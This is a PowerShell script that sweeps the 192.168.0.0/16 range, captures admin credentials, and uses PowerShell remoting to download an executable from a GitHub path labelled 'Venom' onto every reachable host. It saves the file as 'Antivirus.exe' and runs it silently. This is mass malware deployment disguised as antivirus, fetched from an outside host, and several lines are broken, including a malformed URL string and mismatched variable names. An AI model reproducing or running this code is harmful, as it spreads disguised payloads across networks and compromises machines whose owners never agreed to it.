function random_text {
    return -join ((97..122)+(65..90) | Get-Random -Count 5 | % {[char]$_})
}

$logFile = "$env:temp\deployment_log.txt"
$credentialPath = "$env:USERPROFILE\Documents\adminCreds.xml"

function Log-Message {
    param (
        [string]$message
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path $logFile -Value "[$timestamp] $message"
}

#Enable-PSRemoting -Force

if ((Get-Service -Name winrm).Status -ne 'Running') {
    Enable-PSRemoting -Force
} else {
    Write-Output "WinRM is already running."
}


function Get-ActiveIPs {
    $baseSubnet = "192.168."
    $activeIPs = @()
    for ($j = 1; $j -le 254; $j++) {
        $subnet = $baseSubnet + $j + "."
        for ($i = 1; $i -le 254; $i++) {
            $ip = $subnet + $i
            try {
                if (Test-Connection -ComputerName $ip -Count 1 -TimeoutSeconds 5 -Quiet) {
                    $activeIPs += $ip
                }
            }
            catch {
                Log-Message "Failed to ping $ip"
            }
        }
    }
    return $activeIPs
}

$wd = random_text
$path = "$env:temp\$wd"
$installerUrl = 'https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/AssassinsCreed_SE.exe" -OutFile "AssassinsCreed_SE.exe"'
$targets = Get-ActiveIPs
$desktoppath = [System.Environment]::GetFolderPath("Desktop")

# if (-not (Test-Path $installerUrl)) {
#     Write-Error "installerUrl not found at $installerUrl"
#     exit
# }

# mkdir $path



# Save credentials securely
$cred = Get-Credential
$cred | Export-Clixml -Path $credentialPath

# Retrieve credentials securely
$adminCreds = Import-Clixml -Path $credentialPath


function Invoke-Retry {
    param (
        [scriptblock]$scriptblock,
        [int]$retries = 3,
        [int]$delay = 5
    )

    for ($i = 1; $i -le $retries; $i++) {
        try {
            & $scriptblock
            return $true
        } catch {
            Log-Message "Attempt $i failed: $_"
            Start-Sleep -Seconds $delay
        }
    }
    return $false
}

$maxJobs = 10
$jobQueue = @()

foreach ($target in $targets) {
    while ($jobQueue.Count -ge $maxJobs) {
        $completedJobs = $jobQueue | Where-Object { $_.State -eq 'Completed' }
        $completedJobs | ForEach-Object {
            Receive-Job -Job $_
            Remove-Job -Job $_
            $jobQueue.Remove($_)
        }
        Start-Sleep -Seconds 1
    }

    $job = Start-Job -ScriptBlock {
        param ($installerUrlUrl, $target, $adminCreds)
        try {
            $randomFolder = [System.IO.Path]::Combine($env:TEMP, (Get-Random -Count 5 | ForEach-Object { [char]$_ } -join ''))
            New-Item -Path $randomFolder -ItemType Directory -ErrorAction Stop
            $installerUrlPath = "$randomFolder\Antivirus.exe"

            Invoke-Command -ComputerName $target -ScriptBlock {
                param ($installerUrlUrl, $installerUrlPath, $desktoppath)
                Invoke-WebRequest -Uri $installerUrlUrl -OutFile $installerUrlPath -ErrorAction Stop
                Copy-Item -Path $installerUrlPath -Destination $desktoppath -ErrorAction Stop
                Start-Process -FilePath "$desktoppath\Antivirus.exe" -ArgumentList "/silent" -Wait
            } -ArgumentList $installerUrlUrl, $installerUrlPath, $desktoppath -Credential $using:adminCreds -ErrorAction Stop
        }
        catch {
            Log-Message "Failed to deploy to $target : $($_)"
        }
    } -ArgumentList $installerUrlUrl, $target, $adminCreds

    $jobQueue += $job
}

# Wait for remaining jobs to complete
while ($jobQueue.Count -gt 0) {
    $completedJobs = $jobQueue | Where-Object { $_.State -eq 'Completed' }
    $completedJobs | ForEach-Object {
        Receive-Job -Job $_
        Remove-Job -Job $_
        $jobQueue.Remove($_)
    }
    Start-Sleep -Seconds 1
}

Write-Output "All tasks completed."
